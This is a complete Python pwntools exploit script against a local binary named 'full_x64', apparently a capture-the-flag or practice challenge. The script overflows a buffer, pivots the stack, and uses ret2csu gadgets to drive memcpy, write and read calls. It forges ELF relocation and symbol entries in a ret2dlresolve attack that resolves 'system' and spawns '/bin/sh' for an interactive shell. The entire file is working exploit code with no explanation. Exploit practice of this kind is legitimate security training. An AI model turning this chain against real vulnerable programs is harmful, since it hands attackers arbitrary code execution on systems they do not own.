#!/usr/bin/env python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./full_x64')
elf = ELF('./full_x64')

read_got = elf.got['read']
write_got = elf.got['write']
memcpy_got = elf.got['memcpy']
gmon_start_plt = elf.plt['__gmon_start__']
plt0 = 0x400490

buf = 0x601040
leave_ret = 0x0000000000400635
pop_rdi_ret = 0x00000000004006a3
pop_rsi_r15_ret = 0x00000000004006a1

# readelf -a ./full_x64 | grep .dynamic
#   [21] .dynamic          DYNAMIC          0000000000600dc8  00000dc8
dynamic = 0x0000000000600dc8
# readelf -a ./full_x64 | grep .rela.plt
#   [10] .rela.plt         RELA             00000000004003f8  000003f8
relplt = 0x00000000004003f8
# readelf -a ./full_x64 | grep SYMTAB
#  0x0000000000000006 (SYMTAB)             0x4002b8
dynsym = 0x4002b8
# readelf -a ./full_x64 | grep STRTAB
#  0x0000000000000005 (STRTAB)             0x400348
dynstr = 0x400348
r_debug_addr = dynamic + 12 * 16 + 8

#gdb.attach(p, 'b *0x400636\nb *0x400689\nc')

def csu(func, rdi, rsi, rdx):
        payload = (
                p64(0x40069a) + p64(0) + p64(1) + p64(func) + p64(rdx) + p64(rsi) + p64(rdi) + 
                p64(0x400680) + 56 * '\x00'
        )
        return payload

def memcpy(dst, src, length): # dst=>+48 ; src=>+40
        return csu(memcpy_got, dst, src, length)

def write(fd, buf, nbytes): # buf=>+40
        return csu(write_got, fd, buf, nbytes)

def read(fd, buf, nbytes): # buf=>+40
        return csu(read_got, fd, buf, nbytes)

link_map_addr = buf + 8
dl_runtime_resolve_addr = buf + 32
reloc_arg = (buf + 4096 - relplt) / 24
payload = (
	((
		'A' * 14 + # padding
		p64(buf + 1024 - 8) + # set rbp=buf+1024-8
		p64(leave_ret) # stack pivot ; set rsp=buf+1024
	).ljust(1024, '\x00') +
		memcpy(buf + 1024 + 160, r_debug_addr, 8) + # buf+1024+120
		memcpy(buf, 0, 16) + # buf+1024+240 ; link_map_addr=buf+8
		memcpy(buf + 1024 + 400, link_map_addr, 8) + # buf+1024+360
		memcpy(buf + 16, 0, 32) + # buf+1024+480 ; l->l_next=buf+40
		memcpy(buf + 1024 + 640, buf + 40, 8) + # buf+1024+600
		memcpy(buf + 16, 0, 32) + # buf+1024+720 ; l->l_next->l_next=buf+40
		memcpy(buf + 1024 + 880, buf + 40, 8) + # buf+1024+840
		memcpy(buf + 16, 0, 96) + # buf+1024+960 ; l->l_next->l_next->l_info[DT_PLTGOT]=buf+104
		memcpy(buf + 1024 + 1120, buf + 104, 8) + # buf+1024+1080
		memcpy(buf + 16, 0, 16) + # buf+1024+1200 ; .got.plt=buf+24
		memcpy(buf + 1024 + 1360, buf + 24, 8) + # buf+1024+1320
		memcpy(buf + 16, 0, 24) + # buf+1024+1440 ; _dl_runtime+resolve=buf+32
		memcpy(buf + 1024 + 1600, link_map_addr, 8) + # buf+1024+1560
		write(1, 0, 0x1c8+8) + # buf+1024+1680
		memcpy(buf + 1024 + 1840, link_map_addr, 8) + # buf+1024+1800
		read(0, 0, 0x1c8+8) + # buf+1024+1920
		memcpy(buf + 1024 + 2176, dl_runtime_resolve_addr, 8) + # buf+1024+2040
		memcpy(buf + 1024 + 2184, link_map_addr, 8) + # buf+1024+2160
		p64(pop_rdi_ret) +
		p64(buf + 4096 + 40) +
		p64(0) + # _dl_runtime_resolve
		p64(0) + # link_map
		p64(reloc_arg) # reloc_arg
	).ljust(4096, '\x00') + # buf+4096
		# Elf64_Rela
		p64(buf) + # r_offset
		p64(0x7 | (((buf + 4096 + 16 - dynsym) / 24) << 32)) + # r_info
		# Elf64_Sym <= buf+4096+16
		p32(buf + 4096 + 32 - dynstr) + # st_name
		p32(0x12) + # st_info
		p32(0) +
		p32(0) +
		# buf+4096+32
		'system\x00\x00' +
		'/bin/sh\x00'
)
p.recvuntil('> ')
p.sendline(payload)
data = p.recv(0x1c8+8)
payload = data[:-8] + p64(0)
raw_input('@')
p.sendline(payload)

p.interactive()

